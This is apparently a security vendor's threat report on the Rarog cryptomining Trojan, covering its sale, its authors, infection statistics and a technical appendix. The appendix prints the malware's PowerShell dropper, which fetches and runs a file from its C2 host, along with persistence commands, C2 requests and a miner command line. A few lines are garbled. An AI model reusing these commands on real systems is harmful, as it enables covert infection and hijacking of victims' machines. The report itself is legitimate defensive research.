To date, Palo Alto\nNetworks has observed roughly 2,500 unique samples, connecting to 161 different command and control (C2) servers.\n\n[Rarog has been seen primarily used to mine the Monero cryptocurrency, however, it has the capability to mine others. It comes equipped with](https://en.wikipedia.org/wiki/Monero_(cryptocurrency))\na number of features, including providing mining statistics to users, configuring various processor loads for the running miner, the ability to\n\n\n-----\n\nect US de ces, a d t e ab ty to oad add t o a s o t e ct\nRarog is in line with the overall trends we’ve seen regarding the rapidly increasing use of cryptocurrency miners. Additionally, Rarog provides\nan affordable way for new criminals to gain entry into this particular type of malware.\nTo date, we have confirmed over 166,000 Rarog-related infections worldwide. The majority of these occur in the Philippines, Russia, and\nIndonesia. While a large number of infections have been recorded by various criminals who have used this mining Trojan, we have seen very\nlittle recorded profits: the highest profits we have observed amount to roughly US $120.\n[The Trojan itself is likely named after a “Raróg”, a fire demon that originates in Slavic mythology and is typically represented as a fiery falcon.](https://en.wikipedia.org/wiki/Rar%C3%B3g)\n\nRarog on the Underground\nThe Rarog Trojan originated on various Russian-speaking criminal underground sites in June 2017, as shown in the image below:\n\n_Figure 1 Posting in Russian underground forum for Rarog malware_\n\nThe malware sells for 6,000 Rubles, or roughly US $104 at today’s exchange rates. Additionally, a guest administration panel is provided to\nallow potential buyers the chance to do a “test drive” by interacting with the interface. This interface may be seen below:\n\n_Figure 2 Rarog administration panel_\n\nNote the two Twitter handles shown in the administration panel above. The first handle, “arsenkooo135”, is the same handle used in various\npostings for this malware family, including the one shown in Figure 1. We observed the second handle, “foxovsky”, interacting with other\nsecurity researchers online. We also tied this handle to a GitHub repository with the same handle that hosts various other malware families.\nEvidence suggests that these two individuals are the ones behind this threat.\n\n\n-----\n\n_Figure 3 Foxovsky handle on Twitter interacting with security researchers regarding the Rarog malware family_\n\n\n-----\n\n_Figure 4 Foxovsky’s GitHub profile, hosting various malware families_\n\nAdditionally, we have seen the “foxovsky” account on GitHub host the Rarog malware family on his or her GitHub account.\n\nRarog Malware Family\n\nAt a very high level, the Rarog Mining Trojan performs the following actions:\n\n_Figure 5 Rarog flow of execution_\n\nThe malware comes equipped with a number of features. It uses multiple mechanisms to maintain persistence on the victim’s machine,\nincluding the use of the Run registry key, scheduled tasks, and shortcut links in the startup folder. At its core, Rarog is a coin mining Trojan and\ngives the attackers the ability to not only download mining software but configure it with any parameters they wish. They’re also able to easily\nthrottle the mining software based on the victim machine’s characteristics.\n\nIn addition to coin mining, Rarog also employs a number of botnet techniques. It allows the attackers to perform a number of actions, such as\ndownloading and executing other malware, levying DDoS attacks against others, and updating the Trojan, to name a few. Throughout the\nmalware’s execution, a number of HTTP requests are made to a remote C2 server. An overview of all of these URIs and their description may\nbe found below:\n\n**URI** **Description**\n\n/2.0/method/checkConnection To ensure the remote server is responding as expected.\n\n/2.0/method/config Get arguments to supply to miner program.\n\n/2.0/method/delay Retrieve time to sleep before executing miner program.\n\n/2.0/method/error Retrieve information about error message to display to the victim.\n\n/2.0/method/get Get location of miner file based on CPU architecture of victim.\n\n/2.0/method/info Get exe name of miner program.\n\n/2.0/method/setOnline Update statistics for victim on C2 server.\n\n/2.0/method/update Used for updating the Rarog Trojan\n\n/4.0/method/blacklist Retrieve a list of process names to check against. Should any be running in the foreground, Rarog will\nsuspend mining operations.\n\n/4.0/method/check Query remote C2 server to determine if ID exists.\n\n/4.0/method/cores Retrieve percentage of CPU to use on victim machines for mining.\n\n/4.0/method/installSuccess Query the C2 server for botnet instructions.\n\n\n-----\n\n/4.0/method/modules Retrieve third-party modules to load on victim.\n\n/4.0/method/threads Determine what tasks to run on the victim machine (USB spreading, helper executables, etc.)\n\nFor additional information on how the Rarog malware family operations, please refer to the Appendix.\n\n**Victim Telemetry**\n\nWe identified a total of 161 C2 servers communicating with the Rarog malware family. A full list may be found in the Appendix. Looking at the\ngeographic distribution of these C2 servers, we see a high concentration of them located in Russia and Germany.\n\n_Figure 6 Distribution of C2 servers hosting Rarog malware_\n\nThe distribution rate of new Rarog samples has varied in the past nine months, with a large spike occurring between late August to late\nSeptember of 2017. At its peak, we encountered 187 unique Rarog samples during the week of September 11, 2017.\n\n_Figure 7 New Rarog malware samples encountered over time_\n\nThese samples confirm at least 166,000 victims spread across the globe. While infections occur in most regions of the world, high\nconcentrations occur in the Philippines, Russia, and Indonesia, as seen in the figure below:\n\n\n-----\n\n_Figure 8 Rarog infections across the globe_\n\nRarog is able to provide telemetry those that have purchased it using the third-party MinerGate mining service. A number of MinerGate API\nkeys were able to be retrieved, however, the profits made by these attackers were minimal at best. The most profitable attacker was found to\ngenerate roughly 0.58 Monero (XMR), and 54 ByteCoin (BCN). By today’s exchange rates, this amounts to $123.68 total. After factoring in the\ncost of the malware itself at $104, the attackers in question have generated very little income. In most cases, they’ve lost money.\n\nTies to Previous Malware Families\n\n[In late October 2017, Kaspersky wrote a blog post about a malware family named ‘DiscordiaMiner’. In this blog post, they describe a](https://securelist.com/tales-from-the-blockchain/82971/)\ncryptocurrency miner that shared a number of characteristics with Rarog. Upon further inspection, they mention the author of the program, who\nis none other than the previously mentioned “foxovsky” user. Indeed, when looking at this user’s GitHub account in Figure 4, we saw the\nsource code to this mining Trojan. The last time the source code to this particular malware was updated was on May 25, 2017.th\n\nLooking at the source code to DiscordiaMiner, we see a large number of similarities with Rarog. So many in fact, that we might reach the\nconclusion that Rarog is an evolution of Discordia. Kaspersky’s blog post discussed some drama concerning this particular malware family on\nvarious underground forums. Accusations were made against the Trojan’s author with substituting customer’s cryptocurrency wallet addresses\nwith his own. This dispute is what ultimately led foxovsky to open-source the DiscordiaMiner program on GitHub. The timeline of when Rarog\nwas first advertised in June 2017, as well as the time DiscordiaMiner was last updated in May 2017, paints, and interesting picture. Based on\nthis information, as well as the heavy code overlap made between the malware families, I suspect that foxovsky rebranded DiscordiaMiner to\nRarog and continued development on this newly named malware family. This re-branding allowed him to get away from the negativity that was\nassociated with DiscordiaMiner.\n\nConclusion\n\nThe Rarog malware family represents a continued trend toward the use of cryptocurrency miners and their demand on the criminal\nunderground. While not incredibly sophisticated, Rarog provides an easy entry for many criminals into running a cryptocurrency mining botnet.\nThe malware has remained relatively unknown for the past nine months barring a few exceptions. As the value of various cryptocurrencies\ncontinues to remain high, it is likely that we’ll continue to see additional malware families with mining functionality surface.\n\nPalo Alto Networks customers are protected against this threat in the following ways:\n\nAll samples referenced in this blog post are appropriately marked as malicious in WildFire and Traps\nAll domains used as C2 servers for Rarog are flagged as malicious\n[Tracking of the Rarog malware family may be done through the AutoFocus Rarog tag](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Rarog)\n\nAppendix\n\n**Technical Malware Analysis**\n\nThe file with the following properties was used to conduct this analysis:\n\nMD5 15361551cb2f705f80e95cea6a2a7c04\n\nSHA1 a388e464edeb8230adc955ed6a78540ed1433078\n\nSHA256 73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a\n\nCompile Time 2018-03-17 16:36:18 UTC\n\nPDB String D:\\Work\\_Rarog\\Release\\Rarog.pdb\n\nWhen Rarog is initially executed, the malware will look for the existence of the following file:\n\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\Isass.exe\n\n\n-----\n\nt e e e t t s e s ss g o t e syste, a og e te ts sta at o out e, c s out ed be o\n\n**Installation Routine**\nThe installation routine begins by creating the following hidden directory path:\n\nC:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\\n\nIt then copies itself to the directory above with a filename of ‘Isass.exe’. This newly copied file is then executed in a new process. After this\ntakes place, the malware makes a HTTP POST request as follows:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nPOST /2.0/method/checkConnection HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0\nContent-Length: 0\nHost: api.polotreck[.]xyz\nHTTP/1.1 200 OK\nServer: nginx/1.13.9\nDate: Tue, 20 Mar 2018 16:34:10 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 12\nConnection: keep-alive\nX-Powered-By: PHP/5.6.30-0+deb8u1\nc3VjY2Vzcw==\n\n\nThe response of the above request is simply base64-encoded and decodes to ‘success’. The response is checked, and if the response of\n‘success’ is received, the malware proceeds.\nThe malware makes the following request to determine if the C2 wishes the malware to spawn a fake error message box:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nPOST /2.0/method/error HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0\nContent-Length: 9\nHost: api.polotreck[.]xyz\nprofile=1\nHTTP/1.1 200 OK\nServer: nginx/1.13.9\nDate: Tue, 20 Mar 2018 16:43:58 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 192\nConnection: keep-alive\nX-Powered-By: PHP/5.6.30-0+deb8u1\nVary: Accept-Encoding\nMTsxO1N5c3RlbSBFcnJvcjtUaGUgcHJvZ3JhbSBjYW4ndCBzdGFydCBiZWNhdXNlIE1TVkNQMTEwLmRsbCBpcyBtaXNzaW5nIGZyb20geW\n\n\nThe base64 response above decodes to the following:\n“1;1;System Error;The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this\nproblem.”\nThe response is split by ‘;’. The first parameter is hardcoded, while the second is used to specify the type of message box to display. The\nfollowing options are provided:\n\n**Parameter** **MessageBox Option**\n\n0 No error message displayed.\n\n1 A stop-sign icon appears in the message box.\n\n2 A question-mark icon appears in the message box.\n\n3 An exclamation-point icon appears in the message box.\n\n4 An icon consisting of a lowercase letter i in a circle appears in the message box.\n\nThe third parameter specifies the title of the message box, while the last parameter represents the message. Using the example previously, we\nare presented with the following message:\n\n\n-----\n\n_Figure 9 Fake error message box displayed by Rarog_\n\nFinally, Rarog will execute the following command, which will kill the current malware instance, and deleting it from disk.\n\n1 cmd.exe /c taskkill /im 73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a.exe /f & erase\nC:\\Users\\Administrato\\Desktop\\73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a.exe & exit\n\n**Post-Installation Routine**\nAfter the installation routine completes and a new instance of Isass.exe is spawned, this new instance of Rarog will check for the existence of\nthe following file:\n\nC:\\ProgramData\\{4FCEED6C-B7D9-405B-A844-C3DBF418BF87}\\driver.dat\n\nIf this file does not exist, Rarog will create the necessary hidden directory structure, and make a series of HTTP POST requests. The first\nrequest will be to ‘/2.0/method/checkConnection’ to ensure the remote C2 server is alive. The second request is to the following:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nPOST /4.0/method/installSuccess HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0\nContent-Length: 9\nHost: api.polotreck[.]xyz\nbuildID=5.1&hwid={1efdb526-2d21-11e8-a30c-8c8590105ceb}&profile=1&os=Microsoft Windows 7 Ultimate\n&platform=x86&processor=Intel(R) Core(TM) i7-7700HQ CPU @ 2.80 GHz&videocard=VMware SVGA 3D\nHTTP/1.1 200 OK\nServer: nginx/1.13.9\nDate: Tue, 20 Mar 2018 16:43:58 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 192\nConnection: keep-alive\nX-Powered-By: PHP/5.6.30-0+deb8u1\n250\n\n\nThe response provided by the C2 server is the stored identifier of the victim within the C2 database. This number is stored in the ‘driver.dat’\nfile.\nThe following registry key is created to ensure Rarog persists across reboots:\n\n1 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows_Antimalware_Host_Syst C:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\Isass.exe\n\nThe following hidden directory is created, and the following three files are written to this location:\nC:\\ProgramData\\WindowsAppCertification\\WindowHelperStorageHostSystemThread.ps1\nC:\\ProgramData\\WindowsAppCertification\\cert.cmd\nC:\\ProgramData\\WindowsAppCertification\\checker.vbs\nThe contents of WindowHelperStorageHostSystemThread.ps1 is as follows:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n$path = 'C:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\'\n$fpath = $path + 'Isass.exe'\n$furl = 'http://api.polotreck[.]xyz/2.0/method/update'\n$isfile = Test-Path $fpath\nif($isfile -eq 'True') {}\nelse{\nNew-Item -ItemType directory -Path $path\n$WebClient = New-Object System.Net.WebClient\n$WebClient.DownloadFile($furl,$fpath)\nStart-Process -FilePath $fpath}\n\n\n-----\n\n1\n2\n\n\ne co te ts o ce t c d s as o o s\n\n@echo off\npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoP -file\nC:\\ProgramData\\WindowsAppCertification\\WindowHelperStorageHostSystemThread.ps1\n\n\nThe contents of checker.vbs is as follows:\n\n\n1\n2\n\n\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run \"C:\\ProgramData\\WindowsAppCertification\\cert.cmd\",0\n\n\nThe following command is executed to create a Scheduled Task to run the checker.vbs script periodically:\n\n1 schtasks.exe /Create /SC MINUTE /MO 30 /TN \"Windows_Antimalware_Host\" /TR\n\"C:\\ProgramData\\WindowsAppCertification\\checker.vbs\" /F\n\nThe following command is executed to create a Scheduled Task to run Isass.exe periodically:\n\n1 schtasks.exe /Create /SC MINUTE /MO 5 /TN \"Windows_Antimalware_Host_Systm\" /TR\n\"C:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\Isass.exe\" /F\n\nAdditionally, the following command is executed to generate a shortcut link in the victim’s startup folder:\n\n1 cmd.exe /c echo Set oWS = WScript.CreateObject(\"WScript.Shell\") > CreateShortcut.vbs & echo sLinkFile =\n\"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Isass.lnk\" >> CreateShortcut.vbs & echo Set\noLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs & echo oLink.TargetPath =\n\"C:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\Isass.exe\" >> CreateShortcut.vbs & echo oLink.Save >> CreateShortcut.vbs\n& cscript CreateShortcut.vbs & del CreateShortcut.vbs\n\nThese various registry modifications, file modifications, and commands executed provides multiple ways for Rarog to persist on the system\nboth across reboots, as well as in instances where the malware dies or is forcibly closed.\nRarog then makes the following POST request to ensure the ID exists on the remote C2 server:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nPOST /4.0/method/check HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0\nContent-Length: 6\nHost: api.polotreck[.]xyz\nid=250\nHTTP/1.1 200 OK\nServer: nginx/1.13.10\nDate: Tue, 20 Mar 2018 20:47:52 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 12\nConnection: keep-alive\nX-Powered-By: PHP/5.6.30-0+deb8u1\nc3VjY2Vzcw==\n\n\nAgain, Rarog looks for a response of 'success'. Rarog continues to make the following POST request:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nPOST /4.0/method/threads HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0\nContent-Length: 0\nHost: api.polotreck[.]xyz\nHTTP/1.1 200 OK\nServer: nginx/1.13.10\nDate: Tue, 20 Mar 2018 20:49:46 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 16\nConnection: keep-alive\nX-Powered-By: PHP/5.6.30-0+deb8u1\nMjsxOzE7MTsyOw==\n\n\nThe decoded response by the C2 server is ‘2;1;1;1;2;’. This data is split via ‘;’ and the values are used to indicate whether certain Rarog\nfeatures are enabled or not. The value of ‘1’ represents ‘On’, while anything else represents ‘Off’.\n\nPosition Name Description\n\n\n-----\n\n0 USB\nDevices\n\n\nSearches the machine for removable drives. Copies Rarog to the removable drive with the name of autorun.exe . Also\ncreates an 'autorun.inf' file in the same directory, which will execute 'autorun.exe' when loaded.\n\n\n1 Helpers Creates the hidden 'C:\\ProgramData\\MicrosoftCorporation\\Windows\\Helpers\\' directory, and copies Isass.exe to\n'SecurityHeaIthService.exe', 'SystemldleProcess.exe', and 'winIogon.exe' in this directory.\n\n\n2 Mining\nStatus\n\n3 Miners\nKiller\n\n4 Task\nManager\n\n\nMakes a POST request to '/2.0/method/get' to retrieve a URL for a mining executable.

This provides a list of DLLs that are placed in the\n'C:\\ProgramData\\MicrosoftCorporation\\Windows\\Modules\\' folder. These DLLs are then loaded by Rarog. The DLLs in\nquestion are expected to have an export function named 'Instance'.\n\nThis does not appear to be used by the malware.\n\n\nWhen the ‘Mining Status’ option is enabled, and a miner is successfully downloaded from a remote server, Rarog will make the following\nrequest to the C2 server:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nPOST /2.0/method/config HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0\nContent-Length: 6\nHost: api.polotreck[.]xyz\nid=250\nHTTP/1.1 200 OK\nServer: nginx/1.13.10\nDate: Wed, 21 Mar 2018 16:55:38 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 108\nConnection: keep-alive\nX-Powered-By: PHP/5.6.30-0+deb8u1\nVary: Accept-Encoding\nLW8geG1yLnBvb2wubWluZXJnYXRlLmNvbTo0NTU2MCAtdSBtb3JlMnNldEBwcm90b25tYWlsLmNvbSAtcCB4IC1rIC10IHtUSFJFQURTfQ=\n\n\nThe response decodes to the following:\n\n1 o xmr.pool.minergate[.]com:45560 -u more2set@protonmail[.]com -p x -k -t {THREADS}\n\nThese parameters will be supplied to the mining program upon execution.

In the event such a\nprogram is running in the foreground, Rarog will suspend mining operations.\nThe malware then makes the following request to retrieve the amount of time that Rarog will sleep before mining on the target victim:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nPOST /2.0/method/delay HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0\nContent-Length: 6\nHost: api.polotreck[.]xyz\nid=250\nHTTP/1.1 200 OK\nServer: nginx/1.13.10\nDate: Wed, 21 Mar 2018 17:11:05 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 5\nConnection: keep-alive\nX-Powered-By: PHP/5.6.30-0+deb8u1\n10000\n\n\nPrior to continuing, Rarog will check the running processes on the system for the following common security applications, and will not proceed\nif found:\n\nNetMonitor\nTaskmgr.exe\nProcess Killer\nKillProcess\nSystem Explorer\nAnVir\nProcess Hacker\n\nRarog takes the previously collected CPU usage percentage and applies it against the number of CPUs found on the system. As an example,\nif a system had four CPU cores, and the setting was at 50%, Rarog could configure the miner to use 2 threads (0.5 x 4). The following mining\ncommand is executed by Rarog:\n\n1 C:\\ProgramData\\{CB28D9D3-6B5D-4AFA-BA37-B4AFAABF70B8}\\xmrig32.exe -o xmr.pool.minergate[.]com:45560 -u\nmore2set@protonmail[.]com -p x -k -t 1\n\n**Botnet Functionality**\nRarog will periodically make HTTP POST requests to the following:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nPOST /2.0/method/setOnline HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0\nContent-Length: 16\nHost: api.polotreck[.]xyz\nid=250&build=5.1\nHTTP/1.1 200 OK\nServer: nginx/1.13.10\nDate: Wed, 21 Mar 2018 17:28:27 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 0\nConnection: keep-alive\nX-Powered-By: PHP/5.6.30-0+deb8u1\n\n\nThis particular URI has the ability to provide additional tasks for Rarog to perform.
